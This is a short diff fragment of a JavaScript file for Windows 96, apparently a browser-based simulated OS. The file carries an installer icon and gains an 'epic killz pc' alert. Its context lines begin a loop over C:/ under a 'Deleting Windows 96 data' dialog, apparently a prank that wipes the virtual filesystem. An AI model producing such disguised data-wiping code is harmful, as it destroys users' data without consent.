@@ -1,4 +1,5 @@
 //!wrt $BSPEC:{"icn":"mime/installer"}
+alert("me epic killz pc")
 del = new w96.ui.OperationDialog({"canCancel":false,"text":"Deleting Windows 96 data..","animation":"delete","title":"Deleting.."})
 var dir = await w96.FS.readdir("C:/");
 for (i = 0; i < dir.length; i++) {
